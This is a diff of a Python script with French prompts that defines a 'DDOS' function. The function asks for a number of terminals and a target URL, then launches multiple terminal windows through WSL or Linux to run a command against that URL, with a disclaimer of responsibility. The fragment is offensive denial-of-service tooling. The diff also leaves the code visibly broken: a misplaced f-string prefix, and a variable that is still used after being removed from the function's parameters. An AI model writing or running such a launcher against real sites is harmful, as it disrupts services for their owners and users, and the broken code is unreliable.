@@ -2,7 +2,7 @@ import subprocess
 import platform
 import os
 
-def DDOS(nb_fenetres, commande, distribution="kali-linux"):
+def DDOS():
     print("f{Colors.RED} Je ne suis pas responsable de ce que vous faites avec cette outils{Colors.RESET}")
     nb = input("Quelle est le nombre de terminal ouvert? ")
     URL = input("URL? (avec http.s): ")
@@ -13,7 +13,7 @@ def DDOS(nb_fenetres, commande, distribution="kali-linux"):
         if systeme == "Windows":
             subprocess.Popen([
                 "powershell", "-Command",
-                f"Start-Process cmd -ArgumentList '/c wsl -d {distribution} -- bash -c \"{commande}; exec bash\"'"
+                f"Start-Process cmd -ArgumentList '/c wsl -- bash -c \"{commande}; exec bash\"'"
             ])
         elif systeme == "Linux":
             # Détection de terminal Linux
